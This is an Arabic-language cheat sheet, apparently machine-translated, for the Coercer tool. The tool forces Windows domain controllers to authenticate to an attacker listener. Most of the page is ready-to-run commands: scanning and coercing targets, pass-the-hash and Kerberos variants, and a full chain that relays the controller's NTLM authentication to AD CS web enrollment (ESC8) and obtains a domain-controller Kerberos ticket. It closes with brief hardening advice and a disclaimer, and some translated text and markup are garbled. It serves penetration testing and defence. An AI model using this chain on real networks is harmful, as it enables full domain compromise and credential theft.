<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪓 الإكراه - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ███████╗██████╗  ██████╗███████╗██████╗ 
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
  ██║     ██║   ██║█████╗  ██████╔╝██║     █████╗  ██████╔╝
  ██║     ██║   ██║██╔══╝  ██╔══██╗██║     ██╔══╝  ██╔══██╗
  ╚██████╗╚██████╔╝███████╗██║  ██║╚██████╗███████╗██║  ██║
   ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
       Active Directory Multi-Protocol Windows Authentication Coercion Engine
```
<p align="center">
  <img src="https://img.shields.io/badge/Coercer-RPC_Coercion-blue?style=for-the-badge" alt="Coercer">
  <img src="https://img.shields.io/badge/Author-p0dalirius-orange?style=for-the-badge" alt="p0dalirius">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="License GPLv3">
</ص>

<p align="center">
  <b>🌐 فحص واكتشاف وإجبار خوادم Windows ووحدات التحكم بالمجال تلقائيًا على المصادقة مرة أخرى على الأجهزة العشوائية عبر أكثر من 12 بروتوكول RPC</b>
</ص>

---

## 📋 جدول المحتويات

- [نظرة عامة وبدائية إكراه المصادقة](#-نظرة عامة--بدائية-إكراه المصادقة)
- [بروتوكولات وأساليب RPC المدعومة](#-supported-rpc-protocols--methods)
- [التثبيت](#-التثبيت)
- [البحث عن واجهات RPC الضعيفة (`scan`)](#-scanning-for-vulnerable-rpc-interfaces-scan)
- [تنفيذ إكراه المصادقة (`coerce`)](#-تنفيذ-مصادقة-الإكراه-الإكراه)
- [سلسلة الهجوم الكاملة: الإكراه -> NTLM Relay -> AD CS ESC8](#-the-full-attack-chain-coercion---ntlm-relay---ad-cs-esc8)
- [تصفية البروتوكول والطريقة](#-بروتوكول--تصفية الطريقة)
- [دعم Kerberos وتمرير التجزئة](#-kerberos--دعم تمرير التجزئة)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [الاعتبارات الدفاعية والتصلب](#-الاعتبارات الدفاعية--التصلب)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)

---

## 🎯 نظرة عامة وإكراه المصادقة البدائي

في بيئات Active Directory، **إكراه المصادقة** هو أمر بدائي مدمر. إنه يستغل واجهات RPC القديمة المطبقة في خدمات Windows والتي تسمح للمستخدم المعتمد بمطالبة جهاز بعيد (مثل وحدة تحكم المجال) بالاتصال بمسار UNC المعين (`\\attacker\share`).

عندما يتصل جهاز Windows البعيد بالجهاز الذي يتحكم فيه المهاجم، فإنه يبدأ **مصادقة NTLM لحساب الجهاز** (`DC01$`). 

من خلال التقاط بيانات اعتماد حساب الجهاز أو ترحيلها باستخدام `ntlmrelayx` إلى خدمات شهادات Active Directory (تسجيل ويب AD CS - ESC8) أو أهداف التفويض غير المقيدة، يمكن للمهاجمين تحقيق **تسوية فورية كاملة للنطاق**.

من تأليف **Clément Notin (p0dalirius)**، تعمل **Coercer** على توحيد ما يزيد عن اثني عشر برنامجًا فرديًا لاستغلال الإكراه (PetitPotam، وPintererBug، وShadowCoerce، وDFSCoerce) في إطار عمل واحد آلي ومعياري للغاية.

---

## 🔌 بروتوكولات وأساليب RPC المدعومة

يختبر Coercer واجهات RPC التالية ويستغلها:

| اسم البروتوكول | اسم الاستغلال الشائع | الأنابيب / الواجهة |
|---------------|--------------------|------------------|
| **MS-EFSRPC** | بيتيبوتام | `\pipe\efsrpc`، `\pipe\lsarpc` |
| **MS-RPRN** | برينتربوغ / SpoolSample | `\pipe\spoolss` |
| **MS-FSRVP** | قوة الظل | `\pipe\FSRVP` |
| **MS-DFSNM** | دفسكورسي | `\pipe\netdfs` |
| **MS-PAN** | طباعةكابوس مجاور | إدارة الطباعة عن بعد |
| **MS-SAMR** | الجبن | مدير حساب الأمان |

---

## 📥 التثبيت
```bash
# Install via pipx (Recommended)
pipx install coercer

# Or via standard pip
pip3 install coercer

# From GitHub source
git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip3 install -r requirements.txt
python3 Coercer.py --help
```
---

## 🔍 البحث عن واجهات RPC الضعيفة (`scan`)

قبل تشغيل الإكراه، قم بفحص وحدات تحكم المجال المستهدفة بأمان لاكتشاف وظائف RPC التي تم تمكينها والتي يمكن الوصول إليها:
```bash
# Scan a single Domain Controller
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1

# Scan an entire range of Domain Controllers
coercer scan -u 'testuser' -p 'Password123' -d 'corp.local' --targets-file dcs.txt
```
---

## ⚡ تنفيذ عملية المصادقة القسرية (`coerce`)

قم بتشغيل اتصال NTLM لحساب الجهاز الصادر من DC الهدف إلى المستمع الخاص بك:
```bash
# Coerce DC (10.10.10.1) to authenticate to attacker machine (10.10.14.5)
coercer coerce -u 'testuser' -p 'Password123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5
```
---

## 💥 سلسلة الهجوم الكاملة: الإكراه -> NTLM Relay -> AD CS ESC8

ناقل تصعيد المجال الأساسي:
```bash
# 1. Start ntlmrelayx targeting the vulnerable AD CS Web Enrollment HTTP endpoint
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Trigger authentication coercion using Coercer
coercer coerce -u 'lowuser' -p 'Pass123' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# 3. ntlmrelayx receives DC01$ authentication and generates a base64 certificate!

# 4. Request a full Domain Admin Kerberos TGT using gettgtpkinit (PKINITtools)
gettgtpkinit.py corp.local/DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
```
---

## 🎯 تصفية البروتوكول والطريقة

استهدف طريقة محددة دون إرسال بريد عشوائي إلى نطاق RPC بالكامل:
```bash
# Coerce using ONLY PetitPotam (MS-EFSRPC)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-EFSRPC

# Coerce using ONLY PrinterBug (MS-RPRN)
coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5 --filter-protocol-name MS-RPRN
```
---

## 🔑 دعم Kerberos وتمرير التجزئة
```bash
# Authenticate using NTLM Hash (Pass-the-Hash)
coercer coerce -u 'user' --hashes :aad3b435b51404eeaad3b435b51404ee:7fc508... -d 'corp.local' -t 10.10.10.1 -l 10.10.14.5

# Authenticate using Kerberos Ticket (KRB5CCNAME)
export KRB5CCNAME=/tmp/user.ccache
coercer coerce -k -no-pass -d 'corp.local' -t dc01.corp.local -l 10.10.14.5
```
---

## ⚡ جدول مرجعي سريع

| الهدف | الأمر |
|-----------|--------|
| **فحص العاصمة بحثًا عن الإكراه** | `coercer scan -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP>` |
| **المصادقة القسرية** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <ATTACKER_IP>` |
| **الإكراه عبر MS-EFSRPC** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-EFSRPC` |
| **الإكراه عبر MS-RPRN** | `coercer coerce -u <USER> -p <PASS> -d <DOMAIN> -t <DC_IP> -l <IP> --filter-protocol-name MS-RPRN` |
| **إكراه تمرير التجزئة** | `coercer coerce -u <USER> --hashes :<NTLM> -d <DOMAIN> -t <DC_IP> -l <IP>` |
| **إكراه تذكرة Kerberos** | `coercer coerce -k -no-pass -d <DOMAIN> -t <DC_FQDN> -l <IP>` |

---

## 🛡️ الاعتبارات الدفاعية والتصلب

1. **تعطيل Print Spooler على وحدات تحكم المجال DC:** يجب تعطيل خدمة Print Spooler (`spoolsv.exe`) تمامًا على وحدات تحكم المجال (`Stop-Service Spooler -Passthru; Set-Service Spooler -StartupType Disabled`).
2. **تمكين الحماية الموسعة للمصادقة (EPA):** على خوادم AD CS IIS، قم بتمكين EPA واطلب HTTPS لمنع هجمات NTLM Relay.
3. ** تصفية RPC وتقسيم الشبكة: ** تقييد الوصول إلى مخطط نقطة نهاية RPC (منفذ TCP 135) للشبكات الفرعية الإدارية المعتمدة.

---

## ⚠️إخلاء المسؤولية القانونية

> [!تنبيه]
> يقوم Coercer بتشغيل مكالمات المصادقة عن بعد النشطة التي يمكن أن تؤدي إلى زعزعة استقرار خدمات المجال غير المصححة. يُستخدم حصريًا أثناء اختبارات الاختراق المصرح بها وبموافقة صريحة من العميل.